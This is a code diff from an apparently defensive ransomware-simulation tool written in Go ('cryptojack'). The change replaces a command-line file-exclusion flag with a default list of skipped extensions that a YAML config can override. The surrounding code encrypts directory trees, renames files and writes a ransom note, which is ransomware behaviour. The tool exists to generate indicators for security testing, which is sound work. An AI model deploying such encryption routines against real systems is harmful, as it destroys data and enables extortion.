@@ -27,7 +27,6 @@ __________________________________________________
 `
 
 	fmt.Println(banner)
-	arg_exclude := flag.String("e", "exe, dll", "filename extensions which will be excluded")
 	arg_dryrun := flag.Bool("n", false, "perform a dryrun without any encryption actions")
 	arg_norename := flag.Bool("norename", false, "Dont rename files to encrypted filename + extension")
 	arg_cryptext := flag.String("ext", ".cryptojack", "file extension to use for renamed content")
@@ -62,13 +61,16 @@ __________________________________________________
     var config cjlib.YAML_CONFIG
     var err error
     file_ext := *arg_cryptext
+    exclusions := []string {".exe", ".dll", ".lnk", ".sys"}
     if len(*arg_yaml) > 0 {
         config, err = cjlib.ReadYamlConfig(*arg_yaml)
         if (err != nil) { panic(err) }
         if len(config.File_extension) > 0 {
             file_ext = config.File_extension
         }
+        exclusions = config.Exclude
     }
+
     fmt.Printf("\r\n\n[*] =============================================================\n")
     fmt.Printf("[*]  Creating IOC Activity from [%s]\n", *arg_yaml)
     fmt.Printf("[*] =============================================================\n")
@@ -77,7 +79,7 @@ __________________________________________________
 
     // Encrypting directory structure
 	_, _, _, err = cjlib.EncryptDirectoryStructure(
-		*arg_directory, aeskey, *arg_exclude,
+		*arg_directory, aeskey, exclusions,
 		file_ext, config.Ransom_note, *arg_norename, *arg_dryrun)
 	if err != nil {
 		fmt.Printf("[-] %s\n", err.Error())
